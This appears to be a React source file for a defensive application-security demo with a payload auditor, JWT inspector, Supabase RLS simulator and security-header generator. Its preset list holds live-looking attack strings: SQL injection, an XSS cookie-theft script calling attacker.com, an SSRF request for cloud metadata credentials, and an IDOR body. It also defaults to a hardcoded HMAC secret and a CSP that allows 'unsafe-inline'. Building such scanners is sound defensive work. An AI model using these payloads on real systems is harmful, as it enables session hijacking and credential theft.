"use client";

import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { GlassCard } from "@/components/ui/glass-card";
import {
  ShieldAlert,
  ShieldCheck,
  Key,
  Database,
  Lock,
  Sparkles,
  Copy,
  Check,
  Play,
  AlertTriangle,
  FileCode,
  Terminal,
  Loader2,
  Sliders,
  CheckCircle2,
  Flame,
  Info,
} from "lucide-react";

type ActiveTab = "audit" | "jwt" | "rls" | "headers";

const PRESET_ATTACKS = [
  {
    name: "SQL Injection (SQLi)",
    payload: "admin' OR '1'='1' --",
    description: "Classic SQL tautology designed to bypass login authentication without a valid password.",
  },
  {
    name: "Stored / Reflected XSS",
    payload: '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
    description: "Malicious script tag designed to hijack user session cookies.",
  },
  {
    name: "SSRF (Cloud Metadata Exfiltration)",
    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    description: "Attempts to query internal AWS/GCP instance metadata to steal IAM role credentials.",
  },
  {
    name: "Broken Object Auth (BOLA / IDOR)",
    payload: '{"invoice_id": "inv_9981", "user_id": "admin", "override_role": true}',
    description: "Manipulates client-supplied user parameters to access another tenant's billing records.",
  },
  {
    name: "Sanitized Secure Input",
    payload: '{"email": "alex.morgan@company.com", "name": "Alex Morgan"}',
    description: "Clean JSON payload matching strict validation schemas.",
  },
];

export function AegisAppSecDemo() {
  const [activeTab, setActiveTab] = useState<ActiveTab>("audit");

  // ── Tab 1: Payload Auditor State ──
  const [payloadInput, setPayloadInput] = useState(PRESET_ATTACKS[0].payload);
  const [auditLoading, setAuditLoading] = useState(false);
  const [auditResult, setAuditResult] = useState<any>(null);
  const [copiedIndex, setCopiedIndex] = useState<number | null>(null);

  // ── Tab 2: JWT Inspector State ──
  const [jwtInput, setJwtInput] = useState("");
  const [jwtSecret, setJwtSecret] = useState("my-super-secret-key-2025-production");
  const [jwtLoading, setJwtLoading] = useState(false);
  const [jwtResult, setJwtResult] = useState<any>(null);
  const [jwtCopied, setJwtCopied] = useState(false);

  // ── Tab 3: Supabase RLS State ──
  const [rlsTable, setRlsTable] = useState("health_records");
  const [rlsContext, setRlsContext] = useState<"anon" | "authenticated" | "cross_tenant_attacker" | "service_role">("cross_tenant_attacker");
  const [rlsLoading, setRlsLoading] = useState(false);
  const [rlsResult, setRlsResult] = useState<any>(null);

  // ── Tab 4: Security Headers State ──
  const [cspEnabled, setCspEnabled] = useState(true);
  const [hstsEnabled, setHstsEnabled] = useState(true);
  const [xframeEnabled, setXframeEnabled] = useState(true);
  const [nosniffEnabled, setNosniffEnabled] = useState(true);
  const [permPolicyEnabled, setPermPolicyEnabled] = useState(true);
  const [headersCopied, setHeadersCopied] = useState(false);

  // Run Payload Audit
  async function runAudit(customPayload?: string) {
    const textToAudit = customPayload !== undefined ? customPayload : payloadInput;
    setAuditLoading(true);
    try {
      const res = await fetch("/api/projects/aegis-appsec/audit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ payload: textToAudit }),
      });
      const data = await res.json();
      setAuditResult(data);
    } catch {
      alert("Failed to run payload audit.");
    } finally {
      setAuditLoading(false);
    }
  }

  // Generate / Verify JWT
  async function handleJwtAction(action: "generate" | "verify") {
    setJwtLoading(true);
    try {
      const res = await fetch("/api/projects/aegis-appsec/jwt", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action,
          token: jwtInput,
          secret: jwtSecret,
        }),
      });
      const data = await res.json();
      if (action === "generate" && data.token) {
        setJwtInput(data.token);
      }
      setJwtResult(data);
    } catch {
      alert("Failed to process JWT.");
    } finally {
      setJwtLoading(false);
    }
  }

  // Run RLS Policy Simulation
  async function runRlsSimulation() {
    setRlsLoading(true);
    try {
      const res = await fetch("/api/projects/aegis-appsec/rls", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          table: rlsTable,
          userContext: rlsContext,
        }),
      });
      const data = await res.json();
      setRlsResult(data.result);
    } catch {
      alert("Failed to run RLS simulation.");
    } finally {
      setRlsLoading(false);
    }
  }

  function copyCode(text: string, idx?: number) {
    navigator.clipboard.writeText(text);
    if (idx !== undefined) {
      setCopiedIndex(idx);
      setTimeout(() => setCopiedIndex(null), 2000);
    }
  }

  const generatedMiddlewareHeaders = `// Next.js middleware.ts security header configuration
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  const response = NextResponse.next();
${cspEnabled ? `  response.headers.set('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'; frame-ancestors 'none';");\n` : ""}${hstsEnabled ? `  response.headers.set('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');\n` : ""}${xframeEnabled ? `  response.headers.set('X-Frame-Options', 'DENY');\n` : ""}${nosniffEnabled ? `  response.headers.set('X-Content-Type-Options', 'nosniff');\n` : ""}${permPolicyEnabled ? `  response.headers.set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');\n` : ""}  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
  return response;
}`;

  return (
    <div className="space-y-6">
      {/* ── Studio Header & Navigation ── */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between border-b border-white/10 pb-4 gap-4">
        <div className="flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-xl border border-emerald-500/30 bg-emerald-500/10 text-emerald-400 shadow-lg shadow-emerald-500/20">
            <ShieldAlert className="h-5 w-5" />
          </div>
          <div>
            <h3 className="text-lg font-bold text-white flex items-center gap-2">
              Aegis Live AppSec Sentinel
              <span className="rounded-full border border-emerald-500/40 bg-emerald-500/10 px-2 py-0.5 text-[10px] font-bold text-emerald-300">
                v2.4 Production Engine
              </span>
            </h3>
            <p className="text-xs text-slate-400">
              Interactive DevSecOps vulnerability scanner &amp; Supabase RLS policy simulator.
            </p>
          </div>
        </div>

        {/* Tab Controls */}
        <div className="flex flex-wrap gap-1 rounded-xl border border-white/10 bg-white/5 p-1 text-xs">
          <button
            onClick={() => setActiveTab("audit")}
            className={`flex items-center gap-1.5 rounded-lg px-3 py-1.5 font-semibold transition ${
              activeTab === "audit"
                ? "bg-indigo-600 text-white shadow"
                : "text-slate-400 hover:text-white"
            }`}
          >
            <ShieldAlert className="h-3.5 w-3.5" />
            1. Payload Auditor
          </button>
          <button
            onClick={() => setActiveTab("jwt")}
            className={`flex items-center gap-1.5 rounded-lg px-3 py-1.5 font-semibold transition ${
              activeTab === "jwt"
                ? "bg-emerald-600 text-white shadow"
                : "text-slate-400 hover:text-white"
            }`}
          >
            <Key className="h-3.5 w-3.5" />
            2. JWT Inspector
          </button>
          <button
            onClick={() => setActiveTab("rls")}
            className={`flex items-center gap-1.5 rounded-lg px-3 py-1.5 font-semibold transition ${
              activeTab === "rls"
                ? "bg-purple-600 text-white shadow"
                : "text-slate-400 hover:text-white"
            }`}
          >
            <Database className="h-3.5 w-3.5" />
            3. RLS Simulator
          </button>
          <button
            onClick={() => setActiveTab("headers")}
            className={`flex items-center gap-1.5 rounded-lg px-3 py-1.5 font-semibold transition ${
              activeTab === "headers"
                ? "bg-cyan-600 text-white shadow"
                : "text-slate-400 hover:text-white"
            }`}
          >
            <Sliders className="h-3.5 w-3.5" />
            4. Headers Studio
          </button>
        </div>
      </div>

      {/* ══════════════════════════════════════════
          TAB 1: LIVE PAYLOAD & API AUDITOR
         ══════════════════════════════════════════ */}
      {activeTab === "audit" && (
        <div className="space-y-6 animate-fade-in">
          {/* Preset Attack Scenarios */}
          <div className="space-y-2">
            <label className="block text-xs font-bold uppercase tracking-wider text-indigo-300">
              Select Preset Attack Vector or Write Custom Input:
            </label>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2">
              {PRESET_ATTACKS.map((atk, idx) => (
                <button
                  key={idx}
                  onClick={() => {
                    setPayloadInput(atk.payload);
                    runAudit(atk.payload);
                  }}
                  className={`p-3 rounded-xl border text-left transition cursor-pointer flex flex-col justify-between gap-1.5 ${
                    payloadInput === atk.payload
                      ? "border-indigo-500 bg-indigo-500/15 shadow-md"
                      : "border-white/10 bg-white/[0.03] hover:border-white/20 hover:bg-white/[0.06]"
                  }`}
                >
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-xs font-bold text-white">{atk.name}</span>
                    <span className="text-[10px] text-indigo-400 font-mono">Preset #{idx + 1}</span>
                  </div>
                  <p className="text-[11px] text-slate-400 line-clamp-2">{atk.description}</p>
                </button>
              ))}
            </div>
          </div>

          {/* Code Input Card */}
          <GlassCard padding="md" className="space-y-3 border-white/10 bg-slate-950/80">
            <div className="flex items-center justify-between">
              <label className="text-xs font-bold text-slate-300 flex items-center gap-1.5">
                <Terminal className="h-4 w-4 text-indigo-400" />
                Raw Payload / HTTP Body Inspector:
              </label>
              <Button
                onClick={() => runAudit()}
                disabled={auditLoading}
                size="sm"
                className="bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold shadow-lg shadow-indigo-600/30"
              >
                {auditLoading ? (
                  <>
                    <Loader2 className="h-3.5 w-3.5 animate-spin" />
                    Auditing Threat Vector...
                  </>
                ) : (
                  <>
                    <Play className="h-3.5 w-3.5 fill-white" />
                    Execute Live Vulnerability Audit
                  </>
                )}
              </Button>
            </div>

            <textarea
              value={payloadInput}
              onChange={(e) => setPayloadInput(e.target.value)}
              rows={4}
              className="w-full rounded-xl border border-white/10 bg-slate-900/90 p-3 font-mono text-xs text-indigo-200 focus:border-indigo-500 focus:outline-none"
              placeholder="Paste raw query string, JSON body, or URL to audit..."
            />
          </GlassCard>

          {/* Audit Results Presentation */}
          {auditResult && (
            <div className="space-y-4 animate-fade-in">
              <div className="flex flex-wrap items-center justify-between rounded-2xl border border-white/10 bg-slate-900/90 p-4 gap-4">
                <div className="flex items-center gap-4">
                  <div
                    className={`flex h-14 w-14 items-center justify-center rounded-2xl border text-xl font-extrabold ${
                      auditResult.riskScore >= 80
                        ? "border-rose-500/50 bg-rose-500/15 text-rose-400 shadow-lg shadow-rose-500/20"
                        : auditResult.riskScore >= 50
                        ? "border-amber-500/50 bg-amber-500/15 text-amber-400 shadow-lg shadow-amber-500/20"
                        : "border-emerald-500/50 bg-emerald-500/15 text-emerald-400 shadow-lg shadow-emerald-500/20"
                    }`}
                  >
                    {auditResult.riskScore}
                  </div>
                  <div>
                    <p className="text-xs font-bold uppercase tracking-wider text-slate-400">
                      CVSS Risk Score Gauge
                    </p>
                    <p className="text-sm font-bold text-white">
                      {auditResult.riskScore >= 80
                        ? "CRITICAL THREAT LEVEL — Exploitable"
                        : auditResult.riskScore >= 50
                        ? "ELEVATED RISK LEVEL"
                        : "SECURE — Safe from Known Injection Patterns"}
                    </p>
                  </div>
                </div>

                <div className="text-xs text-slate-400 font-mono">
                  {auditResult.vulnerabilitiesCount} Security Findings Identified
                </div>
              </div>

              {/* Vulnerabilities List */}
              <div className="space-y-4">
                {auditResult.vulnerabilities.map((vuln: any, idx: number) => (
                  <GlassCard
                    key={idx}
                    padding="md"
                    className={`space-y-3 border ${
                      vuln.severity === "CRITICAL"
                        ? "border-rose-500/40 bg-rose-950/10"
                        : vuln.severity === "HIGH"
                        ? "border-amber-500/40 bg-amber-950/10"
                        : "border-emerald-500/40 bg-emerald-950/10"
                    }`}
                  >
                    <div className="flex flex-wrap items-center justify-between gap-2 border-b border-white/10 pb-2">
                      <div className="flex items-center gap-2">
                        <span
                          className={`rounded-md px-2 py-0.5 text-[10px] font-extrabold ${
                            vuln.severity === "CRITICAL"
                              ? "bg-rose-500/20 text-rose-300 border border-rose-500/40"
                              : vuln.severity === "HIGH"
                              ? "bg-amber-500/20 text-amber-300 border border-amber-500/40"
                              : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40"
                          }`}
                        >
                          {vuln.severity} · CVSS {vuln.cvssScore}
                        </span>
                        <h4 className="text-sm font-bold text-white">{vuln.title}</h4>
                      </div>
                      <span className="text-xs font-mono text-slate-400">{vuln.category}</span>
                    </div>

                    <p className="text-xs text-slate-300 leading-relaxed">{vuln.description}</p>

                    <div className="space-y-1.5 pt-1">
                      <div className="flex items-center justify-between">
                        <span className="text-[11px] font-bold uppercase tracking-wider text-emerald-400 flex items-center gap-1">
                          <CheckCircle2 className="h-3.5 w-3.5" />
                          Recommended Hardening Code Fix (TypeScript):
                        </span>
                        <button
                          onClick={() => copyCode(vuln.remediationCode, idx)}
                          className="flex items-center gap-1 text-[11px] text-slate-400 hover:text-white bg-white/5 hover:bg-white/10 px-2 py-0.5 rounded border border-white/10 transition"
                        >
                          {copiedIndex === idx ? (
                            <>
                              <Check className="h-3 w-3 text-emerald-400" /> Copied
                            </>
                          ) : (
                            <>
                              <Copy className="h-3 w-3" /> Copy Fix
                            </>
                          )}
                        </button>
                      </div>

                      <pre className="overflow-x-auto rounded-xl border border-white/10 bg-slate-950 p-3 font-mono text-[11px] text-emerald-200">
                        <code>{vuln.remediationCode}</code>
                      </pre>
                    </div>
                  </GlassCard>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* ══════════════════════════════════════════
          TAB 2: JWT SECURITY & CRYPTO INSPECTOR
         ══════════════════════════════════════════ */}
      {activeTab === "jwt" && (
        <div className="space-y-6 animate-fade-in">
          <div className="rounded-2xl border border-emerald-500/30 bg-emerald-950/20 p-4 space-y-2 text-xs text-slate-300">
            <p className="font-bold text-emerald-300 flex items-center gap-1.5">
              <Key className="h-4 w-4" />
              Cryptographic JWT Vulnerability Analyzer
            </p>
            <p>
              Inspect JSON Web Tokens for critical signature flaws, algorithm <code>none</code> bypass exploits, and weak HMAC secret keys. Click <strong>Generate Sample Token</strong> to test immediately!
            </p>
          </div>

          <div className="grid gap-4 md:grid-cols-2">
            <div className="space-y-2">
              <div className="flex items-center justify-between">
                <label className="text-xs font-bold text-slate-300">Target JWT Token String:</label>
                <button
                  onClick={() => handleJwtAction("generate")}
                  disabled={jwtLoading}
                  className="text-[11px] font-bold text-emerald-400 hover:text-emerald-300 underline"
                >
                  ⚡ Generate Sample Token
                </button>
              </div>
              <textarea
                value={jwtInput}
                onChange={(e) => setJwtInput(e.target.value)}
                rows={5}
                placeholder="Paste JWT string (eyJhbGciOi...)"
                className="w-full rounded-xl border border-white/10 bg-slate-900 p-3 font-mono text-xs text-emerald-300 focus:border-emerald-500 focus:outline-none"
              />
            </div>

            <div className="space-y-2">
              <label className="text-xs font-bold text-slate-300">HMAC Verification Secret Key:</label>
              <input
                type="text"
                value={jwtSecret}
                onChange={(e) => setJwtSecret(e.target.value)}
                className="w-full rounded-xl border border-white/10 bg-slate-900 px-3 py-2 text-xs text-white font-mono focus:border-emerald-500 focus:outline-none"
              />
              <p className="text-[11px] text-slate-400">
                Key length: <strong className="text-white">{jwtSecret.length} chars</strong> (Min recommended: 32 chars).
              </p>

              <Button
                onClick={() => handleJwtAction("verify")}
                disabled={jwtLoading || !jwtInput.trim()}
                className="w-full mt-2 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold shadow-lg shadow-emerald-600/30"
              >
                {jwtLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : "Verify Token Cryptographic Signature"}
              </Button>
            </div>
          </div>

          {/* Decoded JWT Segments */}
          {jwtResult && jwtResult.ok && (
            <div className="grid gap-4 md:grid-cols-2 animate-fade-in">
              <div className="space-y-2">
                <span className="text-xs font-bold text-rose-400 uppercase tracking-wider">
                  Decoded Header (JOSE):
                </span>
                <pre className="rounded-xl border border-rose-500/30 bg-slate-950 p-3 font-mono text-xs text-rose-300 overflow-x-auto">
                  <code>{JSON.stringify(jwtResult.header, null, 2)}</code>
                </pre>
              </div>

              <div className="space-y-2">
                <span className="text-xs font-bold text-purple-400 uppercase tracking-wider">
                  Decoded Payload (Claims):
                </span>
                <pre className="rounded-xl border border-purple-500/30 bg-slate-950 p-3 font-mono text-xs text-purple-300 overflow-x-auto">
                  <code>{JSON.stringify(jwtResult.payload, null, 2)}</code>
                </pre>
              </div>
            </div>
          )}
        </div>
      )}

      {/* ══════════════════════════════════════════
          TAB 3: SUPABASE ROW-LEVEL SECURITY (RLS)
         ══════════════════════════════════════════ */}
      {activeTab === "rls" && (
        <div className="space-y-6 animate-fade-in">
          <div className="rounded-2xl border border-purple-500/30 bg-purple-950/20 p-4 space-y-2 text-xs text-slate-300">
            <p className="font-bold text-purple-300 flex items-center gap-1.5">
              <Database className="h-4 w-4" />
              PostgreSQL / Supabase Row-Level Security (RLS) Policy Simulator
            </p>
            <p>
              Test whether specific user session contexts can access sensitive multi-tenant or healthcare patient rows.
            </p>
          </div>

          <div className="grid gap-4 sm:grid-cols-3">
            <div>
              <label className="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1">
                Target Database Table:
              </label>
              <select
                value={rlsTable}
                onChange={(e) => setRlsTable(e.target.value)}
                className="w-full rounded-xl border border-white/10 bg-slate-900 px-3 py-2 text-xs text-white"
              >
                <option value="health_records">health_records (Clinical Vitals &amp; Glucose)</option>
                <option value="billing_invoices">billing_invoices (Multi-Tenant Financials)</option>
              </select>
            </div>

            <div>
              <label className="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1">
                Simulated User Session Context:
              </label>
              <select
                value={rlsContext}
                onChange={(e) => setRlsContext(e.target.value as any)}
                className="w-full rounded-xl border border-white/10 bg-slate-900 px-3 py-2 text-xs text-white"
              >
                <option value="cross_tenant_attacker">🚨 Cross-Tenant Attacker (tenant_b trying to read tenant_a)</option>
                <option value="anon">👤 Anonymous Public User (anon key)</option>
                <option value="authenticated">✅ Legitimate Owner (auth.uid matches patient_id)</option>
                <option value="service_role">⚡ Supabase Service Role Key (Backend Superuser)</option>
              </select>
            </div>

            <div className="flex items-end">
              <Button
                onClick={runRlsSimulation}
                disabled={rlsLoading}
                className="w-full bg-purple-600 hover:bg-purple-500 text-white text-xs font-bold shadow-lg shadow-purple-600/30"
              >
                {rlsLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : "Simulate RLS Access Policy"}
              </Button>
            </div>
          </div>

          {/* RLS Output */}
          {rlsResult && (
            <GlassCard padding="md" className="space-y-4 border-purple-500/30 bg-slate-950/90 animate-fade-in">
              <div className="flex items-center justify-between border-b border-white/10 pb-2">
                <div className="flex items-center gap-2">
                  <span
                    className={`rounded-md px-2 py-0.5 text-xs font-bold ${
                      rlsResult.allowed
                        ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40"
                        : "bg-rose-500/20 text-rose-300 border border-rose-500/40"
                    }`}
                  >
                    {rlsResult.allowed ? "ACCESS GRANTED" : "ACCESS BLOCKED (403)"}
                  </span>
                  <span className="text-xs font-mono text-slate-300">{rlsResult.table}</span>
                </div>
                <span className="text-xs font-bold text-emerald-400">Verdict: {rlsResult.securityVerdict}</span>
              </div>

              <p className="text-xs text-slate-300">{rlsResult.statusText}</p>

              <div className="space-y-1">
                <span className="text-[11px] font-bold uppercase tracking-wider text-purple-300">
                  Active PostgreSQL RLS Policy Statement:
                </span>
                <pre className="rounded-xl border border-white/10 bg-slate-900 p-3 font-mono text-xs text-purple-200 overflow-x-auto">
                  <code>{rlsResult.sqlPolicySnippet}</code>
                </pre>
              </div>
            </GlassCard>
          )}
        </div>
      )}

      {/* ══════════════════════════════════════════
          TAB 4: SECURITY HEADERS & CSP STUDIO
         ══════════════════════════════════════════ */}
      {activeTab === "headers" && (
        <div className="space-y-6 animate-fade-in">
          <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
            <label className="flex items-center justify-between p-3 rounded-xl border border-white/10 bg-white/5 cursor-pointer">
              <span className="text-xs font-bold text-white">Content-Security-Policy (CSP)</span>
              <input
                type="checkbox"
                checked={cspEnabled}
                onChange={(e) => setCspEnabled(e.target.checked)}
                className="rounded"
              />
            </label>
            <label className="flex items-center justify-between p-3 rounded-xl border border-white/10 bg-white/5 cursor-pointer">
              <span className="text-xs font-bold text-white">Strict-Transport-Security (HSTS)</span>
              <input
                type="checkbox"
                checked={hstsEnabled}
                onChange={(e) => setHstsEnabled(e.target.checked)}
                className="rounded"
              />
            </label>
            <label className="flex items-center justify-between p-3 rounded-xl border border-white/10 bg-white/5 cursor-pointer">
              <span className="text-xs font-bold text-white">X-Frame-Options: DENY</span>
              <input
                type="checkbox"
                checked={xframeEnabled}
                onChange={(e) => setXframeEnabled(e.target.checked)}
                className="rounded"
              />
            </label>
            <label className="flex items-center justify-between p-3 rounded-xl border border-white/10 bg-white/5 cursor-pointer">
              <span className="text-xs font-bold text-white">X-Content-Type-Options: nosniff</span>
              <input
                type="checkbox"
                checked={nosniffEnabled}
                onChange={(e) => setNosniffEnabled(e.target.checked)}
                className="rounded"
              />
            </label>
            <label className="flex items-center justify-between p-3 rounded-xl border border-white/10 bg-white/5 cursor-pointer">
              <span className="text-xs font-bold text-white">Permissions-Policy (Sensors Block)</span>
              <input
                type="checkbox"
                checked={permPolicyEnabled}
                onChange={(e) => setPermPolicyEnabled(e.target.checked)}
                className="rounded"
              />
            </label>
          </div>

          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <span className="text-xs font-bold text-cyan-300 uppercase tracking-wider">
                Exported Next.js middleware.ts Implementation:
              </span>
              <button
                onClick={() => {
                  copyCode(generatedMiddlewareHeaders);
                  setHeadersCopied(true);
                  setTimeout(() => setHeadersCopied(false), 2000);
                }}
                className="flex items-center gap-1 text-xs text-slate-300 bg-white/5 hover:bg-white/10 px-2.5 py-1 rounded-lg border border-white/10 transition"
              >
                {headersCopied ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                {headersCopied ? "Copied!" : "Copy Snippet"}
              </button>
            </div>
            <pre className="rounded-2xl border border-cyan-500/30 bg-slate-950 p-4 font-mono text-xs text-cyan-200 overflow-x-auto leading-relaxed">
              <code>{generatedMiddlewareHeaders}</code>
            </pre>
          </div>
        </div>
      )}
    </div>
  );
}
